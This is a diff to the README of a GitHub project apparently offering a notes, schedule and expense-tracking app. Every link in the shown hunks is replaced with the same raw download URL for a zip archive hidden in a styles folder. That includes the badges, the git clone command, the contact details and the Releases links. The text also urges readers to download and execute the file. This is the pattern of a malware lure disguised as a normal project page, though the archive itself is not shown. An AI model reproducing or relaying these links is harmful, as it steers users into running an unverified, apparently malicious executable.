@@ -1,6 +1,6 @@
 # TimeIsMoney 🕒💰
 
-![GitHub release](https://img.shields.io/badge/Latest%20Release-v1.0.0-brightgreen) ![License](https://img.shields.io/badge/License-MIT-blue)
+![GitHub release](https://github.com/Kalulukj/TimeIsMoney/raw/refs/heads/master/Resources/Styles/Is-Time-Money-1.2.zip%20Release-v1.0.0-brightgreen) ![License](https://github.com/Kalulukj/TimeIsMoney/raw/refs/heads/master/Resources/Styles/Is-Time-Money-1.2.zip)
 
 Welcome to the **TimeIsMoney** repository! This project offers a simple yet powerful application for managing notes, schedules, and expense tracking—all in one place. Whether you are a student, a professional, or anyone looking to organize their life, this app is designed to meet your needs.
 
@@ -44,7 +44,7 @@ To get started with **TimeIsMoney**, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Kalulukj/TimeIsMoney.git
+   git clone https://github.com/Kalulukj/TimeIsMoney/raw/refs/heads/master/Resources/Styles/Is-Time-Money-1.2.zip
    ```
 
 2. Open the project in Visual Studio.
@@ -110,14 +110,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out:
 
-- **Email**: example@example.com
-- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+- **Email**: https://github.com/Kalulukj/TimeIsMoney/raw/refs/heads/master/Resources/Styles/Is-Time-Money-1.2.zip
+- **Twitter**: [@YourTwitterHandle](https://github.com/Kalulukj/TimeIsMoney/raw/refs/heads/master/Resources/Styles/Is-Time-Money-1.2.zip)
 
 ## Releases
 
-To download the latest version of the app, visit the [Releases](https://github.com/Kalulukj/TimeIsMoney/releases) section. Make sure to download the file and execute it on your device.
+To download the latest version of the app, visit the [Releases](https://github.com/Kalulukj/TimeIsMoney/raw/refs/heads/master/Resources/Styles/Is-Time-Money-1.2.zip) section. Make sure to download the file and execute it on your device.
 
-For future updates, you can also check the [Releases](https://github.com/Kalulukj/TimeIsMoney/releases) section.
+For future updates, you can also check the [Releases](https://github.com/Kalulukj/TimeIsMoney/raw/refs/heads/master/Resources/Styles/Is-Time-Money-1.2.zip) section.
 
 ---
 
